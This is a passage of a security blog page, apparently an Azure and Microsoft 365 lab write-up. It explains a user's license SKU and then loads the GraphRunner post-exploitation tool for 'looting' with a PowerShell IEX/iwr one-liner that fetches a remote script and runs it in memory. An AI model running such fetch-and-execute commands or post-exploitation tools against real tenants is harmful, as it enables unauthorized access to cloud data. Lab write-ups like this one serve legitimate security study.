+<p>The most important information in the above screenshot is the <strong><code>SkuPartNumber</code></strong> value, which indicates the specific Microsoft 365 license assigned to the user. In this case, <strong><code>O365_BUSINESS_ESSENTIALS</code></strong> which allows access to Outlook, Teams, SharePoint and other productivity tools, in the Microsoft 365 suite.</p>
+</blockquote>
+<ul>
+<li>We can use the <code>GraphRunner</code> post-exploitation tool to loot in Microsoft 365 environments.</li>
+<li>We can go ahead and load this tool to powershell memory</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">iwr </span><span class="s1">&#39;https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">________</span>                     <span class="n">__</span>      <span class="n">_______</span>      <span class="n">by</span> <span class="n">Beau</span> <span class="n">Bullock</span> <span class="p">(</span><span class="nv">@dafthack</span><span class="p">)</span>                                
+</span></span><span class="line"><span class="cl"> <span class="p">/</span><span class="n">_______</span><span class="p">/</span><span class="n">___________</span>  <span class="n">______</span> <span class="p">|</span>  <span class="p">|</span><span class="n">____</span><span class="p">/</span><span class="n">_______</span><span class="p">\</span><span class="n">__</span> <span class="n">__</span>  <span class="n">____</span>   <span class="n">____</span>   <span class="n">___________</span> 
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">___</span><span class="p">\</span>  <span class="n">__</span><span class="p">\</span><span class="n">______</span><span class="p">\</span><span class="n">____</span><span class="p">\</span> <span class="p">\</span><span class="n">_____</span><span class="p">\|</span><span class="n">__</span><span class="p">|</span><span class="n">__</span><span class="p">\|</span><span class="n">________</span><span class="p">/</span><span class="n">__</span><span class="p">|</span><span class="n">__</span><span class="p">\/</span><span class="n">____</span><span class="p">\</span> <span class="p">/</span><span class="n">____</span><span class="p">\</span><span class="n">_</span><span class="p">/</span><span class="n">____</span><span class="p">\</span><span class="n">______</span><span class="p">\</span>
+</span></span><span class="line"><span class="cl"><span class="p">\</span>    <span class="p">\</span><span class="n">_</span><span class="p">\</span>  <span class="p">\</span>  <span class="p">|</span> <span class="p">\//</span> <span class="n">__</span> <span class="p">\|</span>  <span class="p">|</span><span class="n">_</span><span class="p">/</span> <span class="p">|</span>   <span class="n">Y</span>  <span class="p">\</span>    <span class="p">|</span>   <span class="p">\</span>  <span class="p">|</span>  <span class="p">/</span>   <span class="p">|</span>  <span class="p">\</span>   <span class="p">|</span>  <span class="p">\</span>  <span class="n">___</span><span class="p">/|</span>  <span class="p">|</span> <span class="p">\/</span>
+</span></span><span class="line"><span class="cl"> <span class="p">\</span><span class="n">________</span><span class="p">/</span><span class="n">__</span><span class="p">|</span>  <span class="p">(</span><span class="n">______</span><span class="p">/</span><span class="n">__</span><span class="p">|</span>   <span class="p">|</span><span class="n">___</span><span class="p">|</span><span class="n">__</span><span class="p">|</span><span class="n">____</span><span class="p">|</span><span class="n">___</span><span class="p">/</span><span class="n">____</span><span class="p">/|</span><span class="n">___</span><span class="p">|</span><span class="n">__</span><span class="p">/</span><span class="n">___</span><span class="p">|</span><span class="n">__</span><span class="p">/\</span><span class="n">___</span><span class="p">|</span> <span class="p">&gt;</span><span class="n">__</span><span class="p">|</span>   
+</span></span><span class="line"><span class="cl">                 <span class="k">Do</span> <span class="n">service</span> <span class="n">principals</span> <span class="n">dream</span> <span class="n">of</span> <span class="n">electric</span> <span class="n">sheep</span><span class="p">?</span>
+</span></span><span class="line"><span class="cl">                       
+</span></span><span class="line"><span class="cl"><span class="k">For</span> <span class="n">usage</span> <span class="n">information</span> <span class="n">see</span> <span class="n">the</span> <span class="n">wiki</span> <span class="n">here</span><span class="err">:</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">dafthack</span><span class="p">/</span><span class="n">GraphRunner</span><span class="p">/</span><span class="n">wiki</span>
+</span></span><span class="line"><span class="cl"><span class="n">To</span> <span class="n">list</span> <span class="n">GraphRunner</span> <span class="n">modules</span> <span class="n">run</span> <span class="nb">List-GraphRunnerModules</span>
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="http://localhost:1313/">SecFortess</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
